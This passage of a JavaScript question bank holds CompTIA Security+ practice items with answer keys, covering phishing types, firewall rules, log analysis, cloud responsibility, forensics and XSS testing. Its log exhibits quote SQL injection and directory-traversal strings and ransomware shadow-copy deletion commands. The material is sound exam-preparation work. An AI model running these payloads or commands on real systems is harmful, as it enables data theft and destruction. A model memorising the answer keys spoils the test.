  { id:"p012", type:"FILL BLANK", ch:"2", cat:"Social Engineering", difficulty:"easy",
    title:"Name the social engineering attack from the channel used",
    emoji:"✏️",
    scenario:"Each sentence describes a social engineering attack. Fill in the name of the attack type.",
    blanks:[
      {id:"a", sentence:"An attacker sends a deceptive email pretending to be a bank to steal login credentials. This is ___.", answer:"Phishing", hint:"Email-based deception"},
      {id:"b", sentence:"An attacker calls a victim on the phone, impersonating their IT support team. This is ___.", answer:"Vishing", hint:"Voice-based phishing"},
      {id:"c", sentence:"An attacker sends a fraudulent text message claiming the victim has won a prize. This is ___.", answer:"Smishing", hint:"SMS-based phishing"},
      {id:"d", sentence:"A targeted phishing email crafted specifically for one named individual is called ___.", answer:"Spear Phishing", hint:"Targeted ___"},
    ],
    explanation:"Social engineering delivery channels: Email = Phishing. Voice/telephone = Vishing. SMS/text = Smishing. Targeted individual = Spear Phishing. Targeted executive (CEO/CFO) = Whaling. A useful memory aid: Vishing = Voice + phishing. Smishing = SMS + phishing. These are fundamental Security+ concepts tested in almost every exam.",
    objective:"2.2"},

  // ── CONFIG / ACL ─────────────────────────────────────────────
  { id:"p013", type:"CONFIG/ACL", ch:"4", cat:"Network Security", difficulty:"hard",
    title:"Select the correct firewall ruleset for a web server",
    emoji:"⚙️",
    scenario:"You are configuring a web server firewall. The server should accept HTTP (port 80), HTTPS (port 443), and SSH from the management subnet 10.0.0.0/24 only. All other traffic should be denied. Choose the BEST ruleset.",
    currentConfig:`Current ruleset (has errors):
RULE 1: ALLOW TCP ANY → ANY PORT 80
RULE 2: ALLOW TCP ANY → ANY PORT 443
RULE 3: ALLOW TCP ANY → ANY PORT 22   ← too permissive
RULE 4: ALLOW IP ANY → ANY            ← dangerous catch-all`,
    options:[
      `Option A:
RULE 1: ALLOW ALL TRAFFIC
(Keep it simple — the application handles security)`,
      `Option B:
RULE 1: ALLOW TCP ANY → SERVER PORT 80
RULE 2: ALLOW TCP ANY → SERVER PORT 443
RULE 3: ALLOW TCP 10.0.0.0/24 → SERVER PORT 22
RULE 4: DENY ALL`,
      `Option C:
RULE 1: ALLOW TCP ANY → SERVER PORT 80
RULE 2: ALLOW TCP ANY → SERVER PORT 443
RULE 3: ALLOW TCP ANY → SERVER PORT 22
RULE 4: DENY ALL`,
      `Option D:
RULE 1: DENY ALL INBOUND
(Most secure — block everything)`,
    ],
    correct:1,
    explanation:"Option B is correct: it allows HTTP and HTTPS from any source (required for a public web server), restricts SSH to only the management subnet (10.0.0.0/24), and has an explicit DENY ALL at the end. Option A removes all firewall protection. Option C allows SSH from any IP — an attacker anywhere can attempt SSH brute force. Option D makes the server unreachable.",
    wrongFeedback:{ 0:"Relying on the application for security violates defence in depth. A firewall must always be the first layer.", 2:"Allowing SSH from ANY IP globally exposes the server to brute-force attacks from anywhere on the internet.", 3:"A DENY ALL rule makes the server completely inaccessible — legitimate web traffic cannot reach it." },
    objective:"3.2"},

  // ── LOG ANALYSIS ─────────────────────────────────────────────
  { id:"p014", type:"LOG ANALYSIS", ch:"4", cat:"Security Operations", difficulty:"medium",
    title:"Identify the attack from web server logs",
    emoji:"📊",
    logData:`Web Server Access Log — 2024-01-15

10.0.1.55 GET /index.html HTTP/1.1 200 4532
10.0.1.55 GET /about.html HTTP/1.1 200 2341
10.0.1.55 GET /products.php?id=1 HTTP/1.1 200 8821
10.0.1.55 GET /products.php?id=1' HTTP/1.1 500 1023   ← HTTP 500
10.0.1.55 GET /products.php?id=1 OR 1=1 HTTP/1.1 200 48221
10.0.1.55 GET /products.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1 200 52891
10.0.1.55 GET /admin HTTP/1.1 403 512
10.0.1.55 GET /admin/../../../etc/passwd HTTP/1.1 200 1823  ← large response`,
    question:"Review the logs. Two different attack types are visible. Which pair correctly identifies them?",
    choices:[
      "DoS attack and XSS",
      "SQL injection and directory traversal",
      "Brute force and phishing",
      "Port scanning and ARP poisoning",
    ],
    correct:1,
    explanation:"Two attacks are visible: (1) SQL injection — the sequence from 'id=1'' causing a 500 error (confirming vulnerability) to 'OR 1=1' and UNION SELECT extracting usernames and passwords. The large 200 responses confirm data was returned. (2) Directory traversal — '/admin' is blocked (403) but '../../../etc/passwd' returns a 200 with a large response, indicating the attacker escaped the web root and read a system file. Both require immediate remediation: parameterised queries and server-side path validation.",
    wrongFeedback:{ 0:"No DoS (no flood of requests) or XSS (no script injection into pages) is visible in these logs.", 2:"No repeated login failures (brute force) or email links (phishing) appear in these logs.", 3:"No port scanning pattern or ARP traffic is visible in web server HTTP logs." },
    objective:"2.3"},

  { id:"p015", type:"LOG ANALYSIS", ch:"4", cat:"Authentication", difficulty:"medium",
    title:"Identify the brute-force pattern in authentication logs",
    emoji:"📊",
    logData:`Authentication Log — 2024-01-15

06:00:01 FAIL user=admin  src=185.220.101.10  method=ssh
06:00:02 FAIL user=admin  src=185.220.101.10  method=ssh
06:00:03 FAIL user=root   src=185.220.101.10  method=ssh
06:00:04 FAIL user=root   src=185.220.101.10  method=ssh
06:00:05 FAIL user=ubuntu src=185.220.101.10  method=ssh
06:01:00 FAIL user=admin  src=185.220.101.11  method=ssh
06:01:01 FAIL user=admin  src=185.220.101.12  method=ssh
06:01:02 FAIL user=admin  src=185.220.101.13  method=ssh
06:15:42 SUCCESS user=admin src=185.220.101.47 method=ssh`,
    question:"What pattern do these logs reveal, and why is the attack structured this way?",
    choices:[
      "A credential stuffing attack using a single IP — the attacker has a list of stolen credentials",
      "A distributed brute-force attack spread across multiple IPs to evade per-IP lockout policies",
      "A password spraying attack trying one common password across many accounts",
      "A replay attack using previously captured authentication tokens",
    ],
    correct:1,
    explanation:"The attack is distributed — multiple source IPs (185.220.101.10, .11, .12, .13, .47) each make only a small number of attempts against the same target. This evades per-IP account lockout policies (which trigger after N failures from the SAME IP). The eventual success from .47 shows the attacker found valid credentials. Mitigations: geo-blocking suspicious IP ranges, subnet-based lockout policies, MFA (which would make this attack useless regardless of the password).",
    wrongFeedback:{ 0:"Credential stuffing tries username/password pairs from previous breach dumps against a service. It doesn't typically cycle through common usernames like 'root' and 'ubuntu'.", 2:"Password spraying tries ONE password (e.g. 'Summer2024!') against MANY different accounts to avoid lockout. Here, the attacker targets the same account (admin) with many passwords.", 3:"Replay attacks reuse captured session tokens — they do not involve failed login attempts." },
    objective:"2.4"},

  // ── SCENARIO ────────────────────────────────────────────────
  { id:"p016", type:"SCENARIO", ch:"3", cat:"Cloud Security", difficulty:"medium",
    title:"Shared responsibility in a cloud breach",
    emoji:"📖",
    scenario:`A company hosts its customer database on a major cloud provider using IaaS. A security review finds that:

• The cloud provider's physical data centres pass all audits
• The company's virtual server was running an unpatched OS with a 6-month-old critical vulnerability
• The database was misconfigured with a default password
• 50,000 customer records were exfiltrated

A regulator asks: 'Who is responsible for this breach?'`,
    question:"Under the shared responsibility model, who is responsible for the failures that led to this breach?",
    choices:[
      "The cloud provider — they should ensure all customer VMs are patched",
      "The customer organisation — OS patching and database configuration are always the customer's responsibility in IaaS",
      "Shared equally — both parties failed their responsibilities",
      "Neither — breaches are force majeure events that cannot be assigned responsibility",
    ],
    correct:1,
    explanation:"In IaaS, the cloud provider is responsible for the infrastructure below the hypervisor (physical security, networking hardware, hypervisor). The customer is responsible for EVERYTHING above: guest OS patching, application configuration, and data security. An unpatched OS and a default password are both customer-controlled items. The provider's physical security being fine is irrelevant — the breach was above the provider's responsibility boundary.",
    wrongFeedback:{ 0:"Cloud providers do not have access to or responsibility for the guest operating systems or application configurations in IaaS. Those are isolated to the customer's virtual environment.", 2:"While the provider shares responsibility in other models (PaaS/SaaS), in IaaS the specific failures (OS patch, default password) are exclusively the customer's responsibility.", 3:"Regulatory frameworks like GDPR explicitly assign responsibility to data controllers. 'Force majeure' does not apply to preventable technical misconfigurations." },
    objective:"3.1"},

  { id:"p017", type:"SCENARIO", ch:"5", cat:"Risk Management", difficulty:"easy",
    title:"Choose the appropriate risk response",
    emoji:"📖",
    scenario:`A small retail company uses an old point-of-sale (POS) system that cannot be updated to support TLS 1.2 or higher. All card transactions currently flow over TLS 1.0, which is deprecated.

The options under consideration are:
A) Do nothing — the system has worked fine for 5 years
B) Buy cyber insurance to cover potential card data breach losses
C) Replace the POS system with a modern one that supports current TLS standards
D) Document the risk formally and continue using the system while replacement is budgeted`,
    question:"Which option BEST represents 'risk avoidance'?",
    choices:[
      "Option A — accepting the status quo with no action",
      "Option B — purchasing insurance to cover breach losses",
      "Option C — replacing the system entirely eliminates the TLS 1.0 risk",
      "Option D — formally documenting the risk while planning replacement",
    ],
    correct:2,
    explanation:"Risk avoidance eliminates the risk by removing or not performing the risky activity. Replacing the POS system removes the TLS 1.0 vulnerability entirely — the risk no longer exists. Option A is risk acceptance (informal, without documentation — negligent). Option B is risk transfer (insurance). Option D is formal risk acceptance with a remediation plan.",
    wrongFeedback:{ 0:"Doing nothing without formal documentation is negligent risk acceptance — not risk avoidance.", 1:"Insurance transfers the financial impact of the risk to an insurer — the TLS 1.0 vulnerability still exists.", 3:"Formally documenting and accepting a risk while planning future remediation is risk acceptance, not avoidance. The risk still exists during the budget period." },
    objective:"5.2"},

  // ── NEW PBQs p018-p050 ───────────────────────────────────────

  { id:"p018", type:"DRAG & DROP", ch:"1", cat:"Cryptography", difficulty:"easy",
    title:"Match cryptographic tools to their purpose",
    emoji:"🔀",
    scenario:"Match each cryptographic tool or concept to its primary purpose in the CompTIA Security+ syllabus.",
    items:[
      {id:"a",label:"TPM (Trusted Platform Module)"},
      {id:"b",label:"HSM (Hardware Security Module)"},
      {id:"c",label:"Key escrow"},
      {id:"d",label:"Certificate Authority (CA)"},
      {id:"e",label:"OCSP"},
    ],
    targets:[
      {id:"1",label:"A chip soldered to the motherboard that stores encryption keys and measures boot integrity"},
      {id:"2",label:"A dedicated hardware device for generating, storing, and managing cryptographic keys at scale"},
      {id:"3",label:"A copy of a private key held by a trusted third party for authorised recovery"},
      {id:"4",label:"An entity that issues and signs digital certificates, establishing a chain of trust"},
      {id:"5",label:"A protocol for checking certificate revocation status in real time"},
    ],
    correctMapping:{a:"1",b:"2",c:"3",d:"4",e:"5"},
    explanation:"TPM is a hardware chip on the motherboard used for secure key storage and measured boot (Secure Boot). HSM is a dedicated, tamper-resistant device for enterprise key management. Key escrow stores a copy of a private key with a trusted third party for lawful recovery. A CA is the trust anchor that signs certificates, binding public keys to identities. OCSP allows real-time certificate revocation checking — more current than CRLs.",
    objective:"1.4"},

  { id:"p019", type:"FILL BLANK", ch:"2", cat:"Social Engineering", difficulty:"easy",
    title:"Name the social engineering attack from the channel",
    emoji:"✏️",
    scenario:"Fill in the name of each social engineering attack type from the description.",
    blanks:[
      {id:"a",sentence:"An attacker sends a deceptive email pretending to be a bank to steal login credentials. This is ___.",answer:"Phishing",hint:"Email-based deception"},
      {id:"b",sentence:"An attacker calls a victim on the phone, impersonating their IT support team. This is ___.",answer:"Vishing",hint:"Voice-based phishing"},
      {id:"c",sentence:"An attacker sends a fraudulent text message claiming the victim has won a prize. This is ___.",answer:"Smishing",hint:"SMS-based phishing"},
      {id:"d",sentence:"A targeted phishing email crafted specifically for one named individual is called ___.",answer:"Spear Phishing",hint:"Targeted, personalised phishing"},
      {id:"e",sentence:"A phishing attack specifically targeting a CEO or CFO is called ___.",answer:"Whaling",hint:"Executive-level target"},
    ],
    explanation:"Social engineering delivery channels: Email=Phishing. Voice/telephone=Vishing. SMS/text=Smishing. Targeted individual=Spear Phishing. Targeted executive=Whaling. Memory aid: Vishing=Voice+phishing. Smishing=SMS+phishing. These are fundamental CompTIA Security+ concepts.",
    objective:"2.2"},

  { id:"p020", type:"ORDERING", ch:"2", cat:"Vulnerability Management", difficulty:"medium",
    title:"Order the vulnerability management lifecycle steps",
    emoji:"📋",
    scenario:"A security team has just run a vulnerability scan on the company's web servers. Place the vulnerability management lifecycle steps in the correct order.",
    items:[
      {id:"a",label:"Validate remediation — rescan to confirm the vulnerability is resolved"},
      {id:"b",label:"Discover — run vulnerability scanner across assets"},
      {id:"c",label:"Report — communicate risk findings to stakeholders"},
      {id:"d",label:"Prioritise — rank by CVSS score and business impact"},
      {id:"e",label:"Remediate — apply patches or compensating controls"},
      {id:"f",label:"Categorise — classify findings by severity and type"},
    ],
    correctOrder:["b","f","d","e","a","c"],
    explanation:"Vulnerability management lifecycle: 1-Discover (scan to find), 2-Categorise (classify by severity/type), 3-Prioritise (CVSS + business context), 4-Remediate (patch or compensating controls), 5-Validate (rescan — never assume patching worked without verification), 6-Report (communicate outcomes). The Validate step before Report is critical — 'patch and pray' is not acceptable governance.",
    objective:"4.3"},

  { id:"p021", type:"SCENARIO", ch:"1", cat:"Security Controls", difficulty:"medium",
    title:"Classify security controls by category and type",
    emoji:"📖",
    scenario:`A company implements the following security measures. Classify each as the BEST matching control category (Technical, Managerial, Operational, Physical) and type (Preventive, Detective, Corrective, Deterrent, Compensating, Directive).

Control A: A security guard patrols the data centre and challenges anyone without a visible badge.
Control B: An intrusion detection system alerts when unusual network traffic patterns are detected.
Control C: A policy document stating that all employees must complete annual security awareness training.
Control D: Automatic system restore from backup after a ransomware attack.`,
    question:"Which pairing CORRECTLY identifies Control B (the IDS)?",
    choices:[
      "Physical — Preventive",
      "Technical — Detective",
      "Managerial — Directive",
      "Operational — Corrective",
    ],
    correct:1,
    explanation:"An IDS is Technical (it is a technology/software solution) and Detective (it identifies and alerts on suspicious activity after or during an event — it does not block or prevent). Control A is Physical+Operational/Deterrent (the guard's presence deters). Control C is Managerial+Directive (a policy document directing behaviour). Control D is Technical+Corrective (automated restoration repairs the damage).",
    wrongFeedback:{0:"Physical controls exist in the physical world (guards, fences, cameras). An IDS is a software/hardware technology — Technical.",2:"Managerial controls are governance documents (policies, procedures). An IDS is an active technology — Technical.",3:"Operational controls involve people and processes. An IDS is a technical tool. Corrective is closer to recovery — Detective is the IDS's primary function (alerting, not fixing)."},
    objective:"1.1"},

  { id:"p022", type:"HOTSPOT", ch:"3", cat:"Cloud Security", difficulty:"medium",
    title:"Identify the shared responsibility boundary",
    emoji:"📍",
    scenario:"Review this shared responsibility diagram for IaaS. Select the layer that represents the BOUNDARY between cloud provider and customer responsibility.",
    diagram:`
CLOUD PROVIDER RESPONSIBILITY
━━━━━━━━━━━━━━━━━━━━━━━
[ Physical Data Centre ]
[ Network Hardware      ]
[ Servers / Compute     ]
[ Storage Hardware      ]
[ Virtualisation Layer  ]  ← [A]
━━━━━━━━━━━━━━━━━━━━━━━
CUSTOMER RESPONSIBILITY
[ Guest Operating System ]  ← [B]
[ Runtime / Middleware   ]
[ Application Code       ]
[ Application Data       ]  ← [C]
━━━━━━━━━━━━━━━━━━━━━━━
[ End Users / IAM        ]  ← [D]`,
    hotspots:[
      {id:"a",label:"[A] Virtualisation Layer — provider/customer boundary",correct:true},
      {id:"b",label:"[B] Guest OS — customer responsibility",correct:false},
      {id:"c",label:"[C] Application Data — customer responsibility",correct:false},
      {id:"d",label:"[D] End Users / IAM — customer responsibility",correct:false},
    ],
    question:"In IaaS, which layer marks the boundary between cloud provider and customer responsibility?",
    choices:[
      "Virtualisation Layer — the provider manages the hypervisor; the customer manages everything above",
      "Guest Operating System — the provider manages the OS; the customer manages applications",
      "Application Data — the provider manages everything below; the customer only manages data",
      "End Users / IAM — the provider manages all infrastructure and software; the customer only manages users",
    ],
    correct:0,
    explanation:"In IaaS, the cloud provider is responsible for physical infrastructure, networking hardware, compute, storage, and the virtualisation layer (hypervisor). The customer is responsible for everything ABOVE the hypervisor: the guest OS, runtime, middleware, application code, and data. This is the fundamental IaaS shared responsibility boundary — tested directly in CompTIA Security+.",
    wrongFeedback:{1:"The guest OS is the CUSTOMER's responsibility in IaaS — the provider does not manage it.",2:"The provider manages everything up to and including the hypervisor — the boundary is much lower than the application data layer.",3:"In IaaS, the provider does not manage software above the hypervisor — the boundary is the virtualisation layer, not IAM."},
    objective:"3.1"},

  { id:"p023", type:"TERMINAL SIM", ch:"4", cat:"Hardening", difficulty:"medium",
    title:"Check and harden Linux file permissions",
    emoji:"💻",
    scenario:"A security audit identified that the file /etc/shadow (which contains hashed passwords) has incorrect permissions. This file should be readable ONLY by root. Check the current permissions and determine what they should be.",
    hint:"Use: check-permissions /etc/shadow",
    answer:`Current permissions:
-rw-r--r-- 1 root root 1842 Jan 15 /etc/shadow
Octal: 644

PROBLEM: World-readable! Any user can read hashed passwords.

Correct permissions should be:
-rw-r----- 1 root shadow 1842 Jan 15 /etc/shadow
Octal: 640

Command to fix: chmod 640 /etc/shadow && chown root:shadow /etc/shadow`,
    question:"The current permission is 644. What does the '4' in the others position mean, and why is it dangerous?",
    choices:[
      "Others have write permission — they can modify the shadow file",
      "Others have read permission — any user on the system can read the hashed passwords and attempt offline cracking",
      "Others have execute permission — they can run the shadow file as a script",
      "The file is setuid — any user gains root privileges when reading it",
    ],
    correct:1,
    explanation:"In octal 644: Owner=6(rw-), Group=4(r--), Others=4(r--). The '4' in the Others position means any local user can READ /etc/shadow. This exposes all hashed passwords to offline cracking attacks. The correct permission is 640 (Owner:rw-, Group:r--, Others:---) with group 'shadow'. This way only root and members of the shadow group can read it.",
    wrongFeedback:{0:"Write permission would be '2' in octal. '4' is read permission — dangerous because users can exfiltrate and crack the hashes.",2:"Execute permission would be '1' in octal. '4' is read — /etc/shadow is a data file, not executable.",3:"The setuid bit (4000) is a separate special permission. '644' means read/write for owner, read for group and others."},
    objective:"2.5"},

  { id:"p024", type:"DRAG & DROP", ch:"4", cat:"Security Operations", difficulty:"medium",
    title:"Match monitoring tools to their primary function",
    emoji:"🔀",
    scenario:"Match each security monitoring tool to its primary function.",
    items:[
      {id:"a",label:"SIEM"},
      {id:"b",label:"IDS (Intrusion Detection System)"},
      {id:"c",label:"IPS (Intrusion Prevention System)"},
      {id:"d",label:"DLP (Data Loss Prevention)"},
      {id:"e",label:"WAF (Web Application Firewall)"},
    ],
    targets:[
      {id:"1",label:"Aggregates logs from multiple sources, correlates events, and generates security alerts"},
      {id:"2",label:"Monitors network traffic and alerts on suspicious patterns — does NOT block traffic"},
      {id:"3",label:"Monitors network traffic and actively blocks malicious traffic inline"},
      {id:"4",label:"Monitors and prevents sensitive data from leaving the organisation"},
      {id:"5",label:"Inspects HTTP/HTTPS traffic and blocks Layer 7 web application attacks"},
    ],
    correctMapping:{a:"1",b:"2",c:"3",d:"4",e:"5"},
    explanation:"Key distinctions: IDS=passive/alerts only; IPS=inline/blocks. SIEM=log aggregation+correlation across multiple sources. DLP=data exfiltration prevention (content-aware). WAF=Layer 7 HTTP inspection for SQLi, XSS, etc. These tools are complementary, not substitutes. The IDS vs IPS distinction is heavily tested in CompTIA Security+.",
    objective:"4.4"},

  { id:"p025", type:"LOG ANALYSIS", ch:"2", cat:"Malware Analysis", difficulty:"medium",
    title:"Identify ransomware indicators from system logs",
    emoji:"📊",
    logData:`Windows Event Log — 2024-01-15 14:23:00

EventID 4688 - Process Created: vssadmin.exe delete shadows /all /quiet
              Parent: cmd.exe (PID 4892)

EventID 4663 - File Access: C:\\Users\\Finance\\*.xlsx → ENCRYPTED
              Process: unknown_svc.exe (PID 5201)

EventID 4688 - Process Created: cipher.exe /w:C:\\
              Parent: unknown_svc.exe (PID 5201)

EventID 7045 - New Service Installed: "WindowsUpdater"
              Binary Path: C:\\ProgramData\\svcupdate.exe

Network Log:
14:23:45 DNS Query: a7f3k2m9.onion → BLOCKED by DNS filter
14:24:01 HTTPS POST: 192.0.2.55:443 → 2.4MB uploaded`,
    question:"Based on these logs, what has occurred and what should be the FIRST response action?",
    choices:[
      "Legitimate Windows Update — EventID 7045 shows a new service was installed",
      "Ransomware attack in progress — VSS shadows deleted, files encrypted, C2 communication attempted. First action: isolate the affected system from the network immediately",
      "Malware scan triggered by antivirus — the cipher.exe process is the AV scanning files",
      "Insider threat copying files to external storage — the 2.4MB upload is data exfiltration",
    ],
    correct:1,
    explanation:"Critical ransomware indicators: (1) vssadmin delete shadows — ransomware deletes Volume Shadow Copies to prevent recovery. (2) Mass file encryption (.xlsx files). (3) New suspicious service installed for persistence. (4) .onion DNS query — Tor-based C2 communication. (5) Outbound upload — likely data exfiltration before encryption (double extortion). First response: network isolation (pull the network cable or disable the NIC) to stop spread and C2 communication.",
    wrongFeedback:{0:"EventID 7045 shows a suspicious service named 'WindowsUpdater' at an unusual path — legitimate Windows updates do not install this way.",2:"Cipher.exe is being used for wiping free space after encryption, not as an AV scanner. The parent process is the malicious unknown_svc.exe.",3:"Data exfiltration may also be occurring (double extortion), but the primary indicators are ransomware — file encryption and VSS deletion are the defining actions."},
    objective:"2.4"},

  { id:"p026", type:"ORDERING", ch:"5", cat:"Business Continuity", difficulty:"medium",
    title:"Order the BCP/DR activation steps",
    emoji:"📋",
    scenario:"A major fire has destroyed the primary data centre. Place the business continuity and disaster recovery activation steps in the correct order.",
    items:[
      {id:"a",label:"Restore data from offsite backups to the DR site"},
      {id:"b",label:"Declare a disaster and activate the BCP/DR plan"},
      {id:"c",label:"Test restored systems and validate data integrity"},
      {id:"d",label:"Redirect users and services to the DR site"},
      {id:"e",label:"Assess the extent of damage and determine if DR activation is needed"},
      {id:"f",label:"Conduct a post-incident review and update the BCP"},
    ],
    correctOrder:["e","b","a","c","d","f"],
    explanation:"BCP/DR activation order: 1-Assess damage (is it severe enough to declare disaster?). 2-Declare disaster and activate plan (mobilise the DR team). 3-Restore data to DR site from backups. 4-Test and validate restored systems (never redirect users to untested systems). 5-Redirect users to DR site (failover). 6-Post-incident review (lessons learned and BCP update). Validation before failover is critical — redirecting users to corrupt data is worse than the outage.",
    objective:"5.2"},

  { id:"p027", type:"SCENARIO", ch:"2", cat:"Network Attacks", difficulty:"hard",
    title:"Analyse a network attack from packet evidence",
    emoji:"📖",
    scenario:`A network analyst observes the following in a 30-second capture:

Observation 1: Host 10.0.0.5 sent 15,000 packets to 192.168.1.10:443 — each with only the SYN flag set. No ACK responses were seen from 10.0.0.5.

Observation 2: The source IPs varied: 10.0.0.5, 10.0.0.6, 10.0.0.7... up to 10.0.0.254 — all sending to the same destination.

Observation 3: The target server 192.168.1.10 stopped responding to legitimate HTTPS requests after 18 seconds.

Observation 4: A check of 10.0.0.5 shows it has no memory of the captured connections — the source IPs appear spoofed.`,
    question:"What attack is occurring, what makes it particularly effective, and which mitigation addresses the ROOT CAUSE?",
    choices:[
      "ARP poisoning — effective because it operates at Layer 2; mitigation is Dynamic ARP Inspection",
      "Distributed SYN Flood (DDoS) — effective because spoofed IPs evade per-IP blocking; root cause mitigation is SYN cookies on the server",
      "DNS amplification — effective because small queries produce large responses; mitigation is closing open DNS resolvers",
      "SSL stripping — effective because users don't notice the HTTP downgrade; mitigation is HSTS",
    ],
    correct:1,
    explanation:"This is a distributed SYN Flood. SYN packets are sent from spoofed source IPs so the server sends SYN-ACKs to non-existent hosts — the half-open connections fill the connection table. Distribution across spoofed IPs evades per-source-IP rate limiting and firewalls. SYN cookies solve the ROOT CAUSE: the server encodes connection state cryptographically in the SYN-ACK rather than allocating a table entry — no state is stored until the legitimate ACK arrives.",
    wrongFeedback:{0:"ARP poisoning operates at Layer 2 within a LAN, modifying ARP caches — it doesn't involve SYN packets or spoofed IP sources across an internet subnet.",2:"DNS amplification uses UDP DNS queries directed at a victim — no SYN packets, no connection state exhaustion.",3:"SSL stripping is a MITM attack that downgrades HTTPS to HTTP — completely different protocol layer and attack mechanism."},
    objective:"2.4"},

  { id:"p028", type:"CONFIG/ACL", ch:"4", cat:"Identity Management", difficulty:"medium",
    title:"Evaluate a password policy configuration",
    emoji:"⚙️",
    scenario:"Review the following four password policy configurations. Select the option that BEST aligns with current security best practices for CompTIA Security+.",
    currentConfig:`Option A — Current Policy (review needed):
Minimum length: 6 characters
Complexity: disabled
Maximum age: 30 days (forced rotation)
History: 3 passwords remembered
Account lockout: 10 attempts`,
    options:[
      "Option A: 6 characters, no complexity, 30-day rotation, 10-attempt lockout",
      "Option B: 8 characters, uppercase+lowercase+number+symbol required, 90-day rotation, 5-attempt lockout",
      "Option C: 15+ characters (passphrase encouraged), complexity optional, no forced rotation (change only on breach evidence), 5-attempt lockout with MFA",
      "Option D: No minimum length, no complexity, no lockout — rely on MFA only",
    ],
    correct:2,
    explanation:"Option C aligns with NIST SP 800-63B and current Security+ guidance: longer passphrases (15+ chars) are stronger than short complex passwords, forced rotation (90-day cycles) causes poor behaviour (users increment passwords), no forced rotation prevents this — change only when compromised. MFA provides the primary security layer. Lockout after 5 attempts with MFA is appropriate. Option D has no password controls at all — MFA alone is insufficient.",
    wrongFeedback:{0:"6-character minimum is far too short. No complexity further weakens this. 10-attempt lockout is too permissive for brute-force protection.",1:"8 characters with complexity is the old standard. Forced 90-day rotation still causes predictable patterns. 15+ character passphrases are stronger.",3:"No minimum length violates basic security hygiene. MFA alone without any password standard is insufficient defence-in-depth."},
    objective:"4.1"},

  { id:"p029", type:"FILL BLANK", ch:"5", cat:"Risk Management", difficulty:"medium",
    title:"Complete the risk management formulas",
    emoji:"✏️",
    scenario:"Fill in the correct term for each risk quantification formula component. These formulas appear directly on the CompTIA Security+ exam.",
    blanks:[
      {id:"a",sentence:"Asset Value × Exposure Factor = ___",answer:"SLE",hint:"Single Loss ___"},
      {id:"b",sentence:"SLE × ARO = ___",answer:"ALE",hint:"Annualized Loss ___"},
      {id:"c",sentence:"ARO stands for Annualized Rate of ___",answer:"Occurrence",hint:"How frequently the event happens per year"},
      {id:"d",sentence:"The ___ is the percentage of asset value destroyed in a single event (e.g. 0.4 = 40%)",answer:"Exposure Factor",hint:"EF — the loss proportion"},
      {id:"e",sentence:"A risk assessment using High/Medium/Low ratings rather than dollar figures is called ___ analysis",answer:"Qualitative",hint:"Non-numerical"},
    ],
    explanation:"CompTIA Security+ risk quantification: EF (Exposure Factor) = % of asset lost per incident. SLE = AV × EF = cost of single event. ARO = annual frequency (0.25 = once every 4 years). ALE = SLE × ARO = expected annual cost. These formulas are tested with calculation questions — practice applying them. Qualitative uses expert judgment (H/M/L); Quantitative uses mathematical models.",
    objective:"5.2"},

  { id:"p030", type:"HOTSPOT", ch:"4", cat:"Digital Forensics", difficulty:"hard",
    title:"Identify the chain of custody violation",
    emoji:"📍",
    scenario:"Review this forensic evidence handling log and identify the step that violates chain of custody.",
    diagram:`EVIDENCE HANDLING LOG — Case #2024-001
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Step 1: [A] Analyst Jones photographs the scene and seizes the laptop.
        Seal: Evidence bag #EV-001. Signed: Jones. Time: 14:30.

Step 2: [B] Analyst Jones creates a forensic image using write blocker.
        Hash (SHA-256) computed and documented. Signed: Jones. Time: 15:45.

Step 3: [C] Image transferred to supervisor Smith for analysis review.
        No signature obtained from Smith at handover. Not documented.

Step 4: [D] Analyst Jones runs analysis on the forensic image copy.
        Findings documented. Time: 17:00.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    hotspots:[
      {id:"a",label:"Step 1 [A] — scene photography and seizure",correct:false},
      {id:"b",label:"Step 2 [B] — forensic imaging with write blocker",correct:false},
      {id:"c",label:"Step 3 [C] — transfer without documentation or signature",correct:true},
      {id:"d",label:"Step 4 [D] — analysis of forensic image copy",correct:false},
    ],
    question:"Which step contains a chain of custody violation?",
    choices:[
      "Step 1 — photographs should be taken before touching anything",
      "Step 2 — the write blocker hash should use MD5, not SHA-256",
      "Step 3 — transferring evidence without obtaining Smith's signature and documenting the handover breaks chain of custody",
      "Step 4 — the analysis should be performed on the original, not the copy",
    ],
    correct:2,
    explanation:"Chain of custody requires that EVERY transfer of evidence is documented with: who transferred it, who received it, the time and date, and both parties' signatures. Step 3 transfers the image to Smith with no signature or documentation — this creates a gap. If the evidence reaches court, the defence can argue the image could have been altered between Step 2 and Step 4 without anyone knowing.",
    wrongFeedback:{0:"Photographing before touching is best practice for physical crime scenes. The digital evidence handling here starts appropriately.",1:"SHA-256 is stronger than MD5 and perfectly acceptable for forensic hashing. MD5 is acceptable but not preferred due to known collision vulnerabilities.",3:"Analysis should ALWAYS be performed on a forensic copy, never the original — Step 4 is correct procedure."},
    objective:"4.8"},

  { id:"p031", type:"DRAG & DROP", ch:"5", cat:"Compliance", difficulty:"medium",
    title:"Match regulations to the data type they protect",
    emoji:"🔀",
    scenario:"Match each regulation or standard to the type of data or organisation it primarily governs.",
    items:[
      {id:"a",label:"HIPAA"},
      {id:"b",label:"PCI DSS"},
      {id:"c",label:"GDPR"},
      {id:"d",label:"SOX"},
      {id:"e",label:"FERPA"},
    ],
    targets:[
      {id:"1",label:"Protected health information (PHI) in the United States"},
      {id:"2",label:"Payment card (credit/debit card) data"},
      {id:"3",label:"Personal data of individuals in the European Union"},
      {id:"4",label:"Financial reporting integrity for publicly traded companies"},
      {id:"5",label:"Student education records in the United States"},
    ],
    correctMapping:{a:"1",b:"2",c:"3",d:"4",e:"5"},
    explanation:"Key compliance frameworks: HIPAA=US healthcare PHI (hospitals, clinics, insurers). PCI DSS=payment card data (any merchant processing cards). GDPR=EU personal data (applies globally if handling EU residents' data). SOX=publicly traded company financial controls and reporting. FERPA=US student education records. Each has specific breach notification requirements and penalties.",
    objective:"5.4"},

  { id:"p032", type:"TERMINAL SIM", ch:"2", cat:"Web Security", difficulty:"hard",
    title:"Identify XSS vulnerability in web application output",
    emoji:"💻",
    scenario:"You are testing a company's web application for cross-site scripting (XSS) vulnerabilities. The application displays a search results page that includes the user's search term in the output.",
    hint:"Test with a harmless script injection to check if input is reflected unescaped: search?q=test",
    answer:`Test 1: search?q=hello
Output: <p>Results for: hello</p>  ← Input reflected in page

Test 2: search?q=<b>hello</b>
Output: <p>Results for: <b>hello</b></p>  ← HTML rendered! Bold text appears

